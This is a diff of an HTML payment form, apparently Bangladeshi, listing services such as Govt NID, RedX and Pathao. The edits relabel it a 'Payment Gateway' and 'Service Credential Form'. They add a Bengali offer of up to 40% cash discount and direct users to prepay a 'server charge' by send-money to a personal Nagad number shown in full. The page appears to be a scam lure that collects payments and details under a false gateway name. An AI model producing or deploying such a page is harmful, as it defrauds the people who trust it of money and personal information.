@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Bulk Payment Page</title>
+  <title>1ai Payment Gateway</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
   <link rel="stylesheet" href="./assets/css/main.css">
 </head>
@@ -12,11 +12,11 @@
 
   <header id="header">
     <h3>Bulk Service Payment</h3>
-    <p>একাধিক কনসাইমেন্ট একসাথে সাবমিট করুন।</p>
+    <p>বিস্তারিত পূরণের পর পেমেন্ট এর পূর্বে ডিস্কাউন্ট বাটনে ক্লিক করে জিতেনিন ৪০% পর্যন্ত আকর্ষনীয় নগদ ডিসকাউন্ট </p>
   </header>
 
   <section>
-    <h3>সার্ভিস রিকুয়েস্ট</h3>
+    <h3>Service Credential Form</h3>
     <div id="discount-display" class="discount-banner">
       <i class="fas fa-tag"></i>
       <span id="discount-text">No active discount</span>
@@ -27,7 +27,7 @@
       <div class="form-group">
         <label for="company">Company:</label>
         <select id="company" name="company" required>
-          <option value="">Select Company</option>
+          <option value="">Select available Company</option>
           <option value="govt_nid">Govt NID</option>
           <option value="redx">RedX</option>
           <option value="pathao">Pathao</option>
@@ -92,15 +92,16 @@
       <div class="form-group">
         <label for="amount3">Total Server Charge:</label>
         <input type="number" id="amount3" name="amount3" readonly required>
-        <small>কার্য সম্পাদনের জন্য সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small>
+        <small>সার্ভারচার্জ অগ্রিম প্রদত্ত নাম্বারে পরিশোধ(send money) করুন</small>
+        <small>নগদ পার্সোনাল: 01923002231</small>
       </div>
 
       <div class="form-group">
         <label for="method">Payment Method:</label>
         <select id="method" name="method" required>
           <option value="">Select Method</option>
-          <option value="Bkash">Bkash</option>
-          <option value="Nagad">Nagad</option>
+          //*<option value="Bkash">Bkash</option>*//
+          <option value="Nagad">Nagad:01923002231</option>
         </select>
       </div>
       
